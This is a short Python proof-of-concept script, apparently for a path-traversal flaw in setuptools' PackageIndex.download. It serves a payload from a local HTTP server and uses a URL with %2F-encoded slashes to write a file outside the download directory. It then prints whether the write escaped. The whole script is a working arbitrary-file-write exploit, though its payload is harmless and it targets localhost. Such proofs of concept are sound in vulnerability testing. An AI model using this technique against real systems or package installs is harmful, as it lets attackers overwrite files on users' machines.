import http.server, os, tempfile, threading
from setuptools.package_index import PackageIndex

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type", "application/octet-stream"); self.end_headers()
        self.wfile.write(b"pwned")
    def log_message(self, *a): pass

srv = http.server.HTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()

tmpdir = tempfile.mkdtemp()
target = os.path.join(tempfile.mkdtemp(), "outside.txt")
url = f"http://127.0.0.1:{srv.server_port}/pkgs/" + target.replace("/", "%2F")

result = PackageIndex().download(url, tmpdir)
print(result, os.path.exists(target), result.startswith(tmpdir))
